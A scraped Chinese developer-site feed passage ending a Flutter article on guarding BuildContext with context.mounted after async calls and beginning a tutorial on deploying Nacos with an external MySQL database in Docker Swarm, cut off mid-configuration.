h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这种情况我们都见过： 你在本地跑着 App，点下“提交”按钮，API 请求顺利完成，页面成功跳转。一切看起来都完美无缺。于是你信心满满地合并了 PR，发布上线。结果，后台日志突然就开始对着你<strong>疯狂咆哮</strong>：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d6199191be24a179e60c010251fca9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmFydmFuTW8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768872865&amp;x-signature=X6AXSEDACCJX%2Bs%2BAkMz4Y%2Fr%2BhlY%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>Looking up a deactivated widget’s ancestor is unsafe.</p>
<p>At this point the state of the widget’s element tree is no longer stable.</p>
</blockquote>
<blockquote>
<p>“查找已停用 Widget 的祖先节点是不安全的。”</p>
<p>“此时，该 Widget 对应的 Element 树状态已不再稳定。”</p>
</blockquote>
<p>你尝试在本地复现这个 Bug，但怎么试都没问题。 这就是所谓的<strong>异步间隙（Async Gap）</strong> 。如果你没有针对它做防御性编程，那么此时此刻，那些网速较慢的用户正在经历频繁的闪退。</p>
<h4 data-id="heading-0">“我电脑上运行好好的” —— 这个陷阱</h4>
<p>作为工程师，我们习惯在飞速的 Wi-Fi 和模拟器上做测试。点一下按钮，API 只要 100 毫秒就返回了。在结果回来之前，我们根本<strong>没时间</strong>切换页面。</p>
<p>但在现实世界里，你的用户可能用的是 3G 甚至更慢的网络。</p>
<ol>
<li>他们点下“登录”。</li>
<li>请求卡住了 3 秒。</li>
<li>用户等烦了（或者意识到邮箱填错了），于是按了**“返回”**键。</li>
<li>此时，Widget 被销毁（Disposed），页面彻底消失了。</li>
<li><strong>紧接着</strong>，API 终于返回成功了。</li>
</ol>
<p>你的代码在 <code>await</code> 之后恢复执行，它顺手抓起 <code>context</code> 准备跳转到首页……然而，这个 <code>context</code> 指向的 Widget 此时已经在**垃圾回收器（GC）**里排队了。</p>
<h4 data-id="heading-1">解决方案：一行微小的代码，省去巨大的头疼</h4>
<p>在 Flutter 3.7 之前，处理这个问题很烦人。你必须在 <code>State</code> 类里检查 <code>mounted</code> 属性，代码写起来很不优雅。现在，我们有了一个简单且统一的方案：</p>
<p><strong><code>context.mounted</code></strong></p>
<p>这个属性允许你检查 <code>context</code> 是否依然有效，以及它是否还在 Widget 树中。 每当你完成一个<strong>异步调用</strong>，并准备执行以下操作时：</p>
<ul>
<li>页面跳转 (Navigation)</li>
<li>弹出对话框 (Dialogs)</li>
<li>显示底栏通知 (Snackbars)</li>
<li>查找主题 (Theme lookups)</li>
<li><strong>任何需要用到 <code>context</code> 的操作</strong></li>
</ul>
<p>……你都必须加上一层防护。</p>
<p><strong>不安全的写法：</strong></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">void</span> onButtonTapped(BuildContext context) <span class="hljs-keyword">async</span> {  
    <span class="hljs-keyword">await</span> myLongRunningTask();  
  
<span class="hljs-comment">// 如果用户已经离开页面，这一行就会导致 App 崩溃。</span>
    Navigator.pop(context);  
}

</code></pre>
<p><strong>安全的写法：</strong></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">void</span> onButtonTapped(BuildContext context) <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// 1. 开始异步任务（例如 API 请求或耗时计算）</span>
  <span class="hljs-keyword">await</span> myLongRunningTask();
  
  <span class="hljs-comment">// 2. 防御性检查（核心守卫语句）</span>
  <span class="hljs-comment">// 如果此时 Widget 已经从树中卸载，则立即停止执行后续代码。</span>
  <span class="hljs-keyword">if</span> (!context.mounted) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 3. 只有在 context 依然有效（Mounted）的情况下，</span>
  <span class="hljs-comment">// 此时使用 context 进行导航或 UI 操作才是安全的。</span>
  Navigator.pop(context);
}
</code></pre>
<h4 data-id="heading-2">为什么资深工程师必须在意这一点？</h4>
<p>这不仅仅是为了避免开发阶段出现红屏报错，更是**防御性编程（Defensive Programming）**的核心体现。</p>
<p>我们无法掌控网络状况，也无法左右用户的行为。 我们唯一能控制的，是当这两者“掉链子”时，我们的代码将如何应对。 养成随手加上 <code>if (!context.mounted) return;</code> 的习惯虽然只是个微小的细节，但它正是<strong>脆弱的 Demo 演示</strong>与<strong>健壮的生产级工程</strong>之间的分水岭。</p>
<h4 data-id="heading-3">最后一个问题</h4>
<p>你最近检查过 Firebase Crashlytics 日志里的这个特定报错吗？或者，你还有哪些曾让你抓狂的“隐形”Bug？</p>
<p><strong>欢迎在评论区留言——我很期待听到你们的调试“血泪史”。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在Swarm中部署Nacos并配置外部MySQL]]></title>    <link>https://juejin.cn/post/7594309641867591718</link>    <guid>https://juejin.cn/post/7594309641867591718</guid>    <pubDate>2026-01-12T22:21:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594309641867591718" data-draft-id="7594337566721605642" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在Swarm中部署Nacos并配置外部MySQL"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-12T22:21:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="都叫我大帅哥"/> <meta itemprop="url" content="https://juejin.cn/user/3956505282886506"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在Swarm中部署Nacos并配置外部MySQL
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3956505282886506/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    都叫我大帅哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T22:21:36.000Z" title="Mon Jan 12 2026 22:21:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    25
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">在Swarm中部署Nacos并配置外部MySQL</h2>
<h3 data-id="heading-1">1. 项目结构调整</h3>
<pre><code class="hljs language-csharp" lang="csharp">project/
├── docker-stack.yml          <span class="hljs-meta"># Swarm主配置文件</span>
├── .env                      <span class="hljs-meta"># 环境变量文件</span>
├── config/
│   ├── mysql-<span class="hljs-keyword">init</span>/
│   │   ├── <span class="hljs-keyword">init</span>.sql         <span class="hljs-meta"># MySQL初始化脚本</span>
│   │   └── nacos-schema.sql <span class="hljs-meta"># Nacos数据库脚本</span>
│   ├── nacos/
│   │   ├── cluster.conf     <span class="hljs-meta"># Nacos集群配置（可选）</span>
│   │   └── application.properties <span class="hljs-meta"># Nacos自定义配置</span>
│   └── nginx/
│       └── nginx.conf       <span class="hljs-meta"># 如果需要nginx代理</span>
├── logs/
│   ├── app/
│   ├── nacos/
│   └── nginx/
└── data/
    ├── mysql/
    ├── redis/
    ├── app-data/
    └── nacos/
        ├── conf/            <span class="hljs-meta"># Nacos配置文件</span>
        ├── data/            <span class="hljs-meta"># Nacos数据</span>
        └── logs/            <span class="hljs-meta"># Nacos日志</span>
</code></pre>
<h3 data-id="heading-2">2. Nacos数据库初始化脚本</h3>
<h4 data-id="heading-3"><code>config/mysql-init/nacos-schema.sql</code></h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建Nacos数据库</span>
<span class="hljs-keyword">CREATE</span> DATABASE IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> nacos <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci;

<span class="hljs-comment">-- 使用Nacos数据库</span>
USE nacos;

<span class="hljs-comment">-- 创建Nacos配置表</span>
<span class="hljs-comment">-- 注意：这里使用Nacos官方提供的SQL脚本，您需要从以下地址下载：</span>
<span class="hljs-comment">-- https://github.com/alibaba/nacos/blob/master/distribution/conf/mysql-schema.sql</span>
<span class="hljs-comment">-- 这里是一个简化的示例，实际使用时请使用官方完整脚本</span>

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> `config_info` (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">'id'</span>,
  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'data_id'</span>,
  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'content'</span>,
  `md5` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'md5'</span>,
  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'创建时间'</span>,
  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'修改时间'</span>,
  `src_user` text COMMENT <span class="hljs-string">'source user'</span>,
  `src_ip` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'source ip'</span>,
  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> COMMENT <span class="hljs-string">'租户字段'</span>,
  `c_desc` <span class="hljs-type">varchar</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `c_use` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `effect` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `type` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `c_schema` text,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),
  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configinfo_datagrouptenant` (`data_id`,`group_id`,`tenant_id`)
) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">'config_info'</span>;

<span class="hljs-comment">-- 其他表结构请从官方GitHub获取完整SQL</span>
</code></pre>
<h4 data-id="heading-4"><code>config/mysql-init/init.sql</code></h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建应用数据库</span>
<span class="hljs-keyword">CREATE</span> DATABASE IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> appdb <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci;

<span class="hljs-comment">-- 创建应用用户</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-string">'appuser'</span>@<span class="hljs-string">'%'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'${MYSQL_PASSWORD}'</span>;
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> appdb.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">'appuser'</span>@<span class="hljs-string">'%'</span>;

<span class="hljs-comment">-- 创建Nacos用户</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-string">'nacos'</span>@<span class="hljs-string">'%'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'${NACOS_DB_PASSWORD}'</span>;
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> nacos.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">'nacos'</span>@<span class="hljs-string">'%'</span>;

FLUSH PRIVILEGES;
</code></pre>
<h3 data-id="heading-5">3. Nacos自定义配置</h3>
<h4 data-id="heading-6"><code>config/nacos/application.properties</code></h4>
<pre><code class="hljs language-properties" lang="properties"># 数据库配置
spring.datasource.platform=mysql
db.num=1
db.url.0=jdbc:mysql://mysql:3306/nacos?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTC
db.user=nacos
db.password=${NACOS_DB_PASSWORD}

# 集群配置（单机模式）
nacos.standalone=true

# 鉴权配置（可选）
nacos.core.auth.enabled=false
nacos.core.auth.server.identity.key=serverIdentity
nacos.core.auth.server.identity.value=security

# 服务发现配置
nacos.naming.empty-service.auto-clean=true
nacos.naming.empty-service.clean.initial-delay-ms=50000
nacos.naming.empty-service.clean.period-time-ms=30000

# 日志配置
server.tomcat.accesslog.enabled=true
server.tomcat.accesslog.pattern=%h %l %u %t "%r" %s %b %D
logging.file.path=/home/nacos/logs
logging.level.com.alibaba.nacos=info
</code></pre>
<h4 data-id="heading-7"><code>config/nacos/cluster.conf</code>（集群模式可选）</h4>
<pre><code class="hljs language-conf" lang="conf"># Nacos集群节点配置
nacos1:8848
nacos2:8848
nacos3:8848
</code></pre>
<h3 data-id="heading-8">4. <code>docker-stack.yml</code></h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-comment"># 定义网络</span>
<span class="hljs-attr">networks:</span>
  <span class="hljs-attr">backend:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">overlay</span>
    <span class="hljs-attr">attachable:</span> <span class="hljs-literal">true</span>

<span class="hljs-comment"># 定义配置</span>
<span class="hljs-attr">configs:</span>
  <span class="hljs-comment"># Nacos配置</span>
  <span class="hljs-attr">nacos-config:</span>
    <span class="hljs-attr">file:</span> <span class="hljs-string">./config/nacos/application.properties</span>
  <span class="hljs-comment"># 应用配置（可选）</span>
  <span class="hljs-attr">app-config:</span>
    <span class="hljs-attr">file:</span> <span class="hljs-string">./config/application.yml</span>

<span class="hljs-comment"># 定义卷</span>
<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">mysql-data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">none</span>
      <span class="hljs-attr">o:</span> <span class="hljs-string">bind</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">./data/mysql</span>
  
  <span class="hljs-attr">redis-data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">none</span>
      <span class="hljs-attr">o:</span> <span class="hljs-string">bind</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">./data/redis</span>
  
  <span class="hljs-attr">nacos-conf:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">none</span>
      <span class="hljs-attr">o:</span> <span class="hljs-string">bind</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">./data/nacos/conf</span>
  
  <span class="hljs-attr">nacos-data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">none</span>
      <span class="hljs-attr">o:</span> <span class="hljs-string">bind</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">./data/nacos/data</span>
  
  <span class="hljs-attr">nacos-logs:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">none</span>
      <span class="hljs-attr">o:</span> <span class="hljs-string">bind</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">./data/nacos/logs</span>
  
  <span class="hljs-attr">app-logs:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">none</span>
      <span class="hljs-attr">o:</span> <span class="hljs-string">bind</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">./logs/app</span>
  
  <span class="hljs-attr">app-data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">none</span>
      <span class="hljs-attr">o:</span> <span class="hljs-string">bind</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">./data/app-data</span>

<span class="hljs-comment"># 定义服务</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-comment"># MySQL服务</span>
  <span class="hljs-attr">mysql:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">mysql:8.0</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">mysql</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">MYSQL_ROOT_PASSWORD:</span> <span class="hljs-string">${MYSQL_ROOT_PASSWORD}</span>
      <span class="hljs-attr">MYSQL_DATABASE:</span> <span class="hljs-string">${MYSQL_DATABASE}</span>
      <span class="hljs-attr">MYSQL_USER:</span> <span class="hljs-string">${MYSQL_USER}</span>
      <span class="hljs-attr">MYSQL_PASSWORD:</span> <span class="hljs-string">${MYSQL_PASSWORD}</span>
      <span class="hljs-attr">TZ:</span> <span class="hljs-string">Asia/Shanghai</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mysql-data:/var/lib/mysql</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./config/mysql-init:/docker-entrypoint-initdb.d</span>  <span class="hljs-comment"># 初始化脚本</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"3306:3306"</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">backend</span>
    <span class="hljs-attr">healthcheck:</span>
      <span class="hljs-attr">test:</span> [<span class="hljs-string">"CMD"</span>, <span class="hljs-string">"mysqladmin"</span>, <span class="hljs-string">"ping"</span>, <span class="hljs-string">"-h"</span>, <span class="hljs-string">"localhost"</span>, <span class="hljs-string">"-u"</span>, <span class="hljs-string">"root"</span>, <span class="hljs-string">"-p$$MYSQL_ROOT_PASSWORD"</span>]
      <span class="hljs-attr">interval:</span> <span class="hljs-string">10s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">3</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">mode:</span> <span class="hljs-string">replicated</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.role</span> <span class="hljs-string">==</span> <span class="hljs-string">manager</span>

  <span class="hljs-comment"># Redis服务</span>
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">redis:7-alpine</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">redis</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">redis-server</span> <span class="hljs-string">--appendonly</span> <span class="hljs-literal">yes</span> <span class="hljs-string">--requirepass</span> <span class="hljs-string">${REDIS_PASSWORD}</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis-data:/data</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"6379:6379"</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">backend</span>
    <span class="hljs-attr">healthcheck:</span>
      <span class="hljs-attr">test:</span> [<span class="hljs-string">"CMD"</span>, <span class="hljs-string">"redis-cli"</span>, <span class="hljs-string">"-a"</span>, <span class="hljs-string">"${REDIS_PASSWORD}"</span>, <span class="hljs-string">"ping"</span>]
      <span class="hljs-attr">interval:</span> <span class="hljs-string">10s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">3s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">3</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">mode:</span> <span class="hljs-string">replicated</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>

  <span class="hljs-comment"># Nacos服务</span>
  <span class="hljs-attr">nacos:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">nacos/nacos-server:${NACOS_VERSION:-2.2.0}</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">nacos</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">MODE:</span> <span class="hljs-string">${NACOS_MODE:-standalone}</span>  <span class="hljs-comment"># standalone 或 cluster</span>
      <span class="hljs-attr">SPRING_DATASOURCE_PLATFORM:</span> <span class="hljs-string">mysql</span>
      <span class="hljs-attr">MYSQL_SERVICE_HOST:</span> <span class="hljs-string">mysql</span>
      <span class="hljs-attr">MYSQL_SERVICE_PORT:</span> <span class="hljs-number">3306</span>
      <span class="hljs-attr">MYSQL_SERVICE_DB_NAME:</span> <span class="hljs-string">nacos</span>
      <span class="hljs-attr">MYSQL_SERVICE_USER:</span> <span class="hljs-string">nacos</span>
